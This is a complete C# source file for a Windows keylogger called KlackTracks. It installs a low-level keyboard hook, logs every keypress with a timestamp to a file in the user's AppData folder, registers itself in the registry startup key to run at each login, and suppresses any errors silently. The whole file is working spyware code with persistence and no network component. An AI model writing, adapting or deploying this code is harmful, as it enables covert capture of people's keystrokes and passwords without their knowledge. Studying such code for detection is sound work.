using System;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Process = System.Diagnostics.Process;
using StreamWriter = System.IO.StreamWriter;

namespace KlackTracks {
    class KlackTracks {
        // A reference to this project's settings file.
        private static readonly Properties.Settings settings = Properties.Settings.Default;
        // The full path of the file being logged to.
        private static readonly string logPath = 
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + settings.LogFile;
        // The stream data will be written to. Log file is created if it doesn't exist.
        private static readonly StreamWriter logStream = new StreamWriter(logPath, true) { AutoFlush = true };
        // A delegate representing the hook procedure method.
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        // Constants required for hook procedures.
        private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100;

        static void Main() {
            var hookId = IntPtr.Zero;
            try {
                // Add this program to the startup list, overwriting any previous values present.
                Registry.CurrentUser.OpenSubKey(settings.StartupKey, true)
                    .SetValue(settings.AppName, Application.ExecutablePath);
                // Set up the hook.
                hookId = SetHook(HookCallback);
                // Start the message loop. Program won't execute past this point if all goes well.
                Application.Run();
                // Reference callback so the garbage collector doesn't swallow it.
                GC.KeepAlive(new HookProc(HookCallback));
            } catch {
                // Die quietly. No need to make a fuss.
            } finally {
                if (hookId != IntPtr.Zero) {
                    UnhookWindowsHookEx(hookId);
                }
            }
        }

        private static IntPtr SetHook(HookProc proc) {
            using (var currentProcess = Process.GetCurrentProcess())
            using (var currentModule = currentProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                var keyCode = (Keys)Marshal.ReadInt32(lParam);
                logStream.WriteLine(DateTime.UtcNow.Ticks + " " + keyCode.ToString());
            }
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        // Installs an application-defined hook procedure into a hook chain.
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(IntPtr hhk);
        // Passes the hook information to the next hook procedure in the current hook chain.
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        // Retrieves a module handle for the specified module.
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
